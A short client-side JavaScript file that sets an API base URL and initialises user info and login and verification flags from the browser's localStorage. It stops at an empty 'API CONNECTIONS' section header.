/**
 * DATA 
 */
const API_URL = 'https://api-yaqui-bntmo.cleverapps.io';
const LS = window.localStorage;
let info = {
    user: '',
    puser: '',
    email: '',
    pemail: '',
    cel: '',
    p: '',
    f: '',
    c: '',
    type: '',
    tok: '',
    err: ''

}

let login = 'false';
let vCard = 'false';
let vEmail = 'false';
let vPass = 'false';
let vToken = 'false';

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

LS.getItem('login') ? login = JSON.parse(LS.getItem('login')) : LS.setItem('login', 'false');
LS.getItem('vCard') ? vCard = JSON.parse(LS.getItem('vCard')) : LS.setItem('vCard', 'false');
LS.getItem('vEmail') ? vEmail = JSON.parse(LS.getItem('vEmail')) : LS.setItem('vEmail', 'false');
LS.getItem('login') ? vToken = JSON.parse(LS.getItem('login')) : LS.setItem('login', 'false');


/**
 * API CONNECTIONS
 */